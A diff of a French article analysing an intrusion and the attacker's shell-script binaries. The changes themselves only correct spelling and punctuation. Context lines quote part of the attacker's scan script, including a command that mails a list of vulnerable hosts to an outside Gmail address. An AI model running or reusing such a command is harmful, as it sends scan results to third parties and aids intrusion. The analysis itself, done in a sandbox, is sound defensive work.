@@ -102,7 +102,7 @@ Tout comme `clean`, `scan` est juste un script shell passé en binaire pour rend
 
 ## Scan, crack, leak, repeat
 
-Après avoir définit un code couleur, il lance les commandes suivantes :  
+Après avoir défini un code couleur, il lance les commandes suivantes :  
 
 ```bash
 if [ $# != 1 ]; then
@@ -140,7 +140,7 @@ cat vuln | mail -s woot woot $1 conf.team@gmail.com
 
 La commande `try` semble faire la même chose que `do`.
 
-L'intrusion en elle même n'était pas exceptionnelle mais les binaires étaient pour le moins intéressants...  
+L'intrusion en elle-même n'était pas exceptionnelle, mais les binaires étaient pour le moins intéressants...  
 
 L'étude a été faite dans un environnement chrooté avec des outils comme strace, ltrace et [SoapBox](http://dag.wieers.com/home-made/soapbox/)
 
